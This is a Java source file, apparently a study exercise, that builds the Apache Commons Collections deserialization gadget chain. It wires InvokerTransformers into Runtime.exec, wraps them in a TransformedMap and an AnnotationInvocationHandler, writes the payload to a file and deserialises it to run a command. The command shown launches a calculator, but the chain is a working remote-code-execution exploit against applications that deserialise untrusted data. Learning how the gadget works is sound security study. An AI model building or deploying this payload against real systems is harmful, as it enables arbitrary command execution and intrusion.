package con.yhy;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class InvokeTransformerTest {
    public static void main(String[] args) throws Exception{
//        Runtime runtime = Runtime.getRuntime();
//        Class c = Runtime.class;
//        Method method = c.getDeclaredMethod("exec", String.class);
//        method.setAccessible(true);
//        method.invoke(runtime, "open -a Calculator");

//        Runtime r = Runtime.getRuntime();
//        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}
//                , new Object[]{"open -a Calculator"});
//        invokerTransformer.transform(r);
//        Method getRuntimeMethod = c.getMethod("getRuntime",null);

//        Method getRuntimeMethod = (Method)new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class},new Object[]{"getRuntime", null}).transform(Runtime.class);
//        Runtime r = (Runtime) new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class},new Object[]{null, null}).transform(getRuntimeMethod);
//        new InvokerTransformer("exec", new Class[]{String.class},new Object[]{"open -a Calculator"}).transform(r);

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class},new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class},new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class},new Object[]{"open -a Calculator"})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
//        chainedTransformer.transform(Runtime.class);


//        Class c = Runtime.class;
//        Method getRuntimeMethod = c.getMethod("getRuntime",null);
//        Runtime r = (Runtime) getRuntimeMethod.invoke(null,null);
//        Method execMethod = c.getMethod("exec", String.class);
//        execMethod.invoke(r, "open -a Calculator");
        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","aaa");
        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,chainedTransformer);
//        for (Map.Entry entry:transformedMap.entrySet()){
//            entry.setValue(r);
//        }

        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object obj = constructor.newInstance(Target.class, transformedMap);
        serialize(obj);
        unserialize("payload.bin");

    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("payload.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object obj = ois.readObject();
        return obj;
    }
}
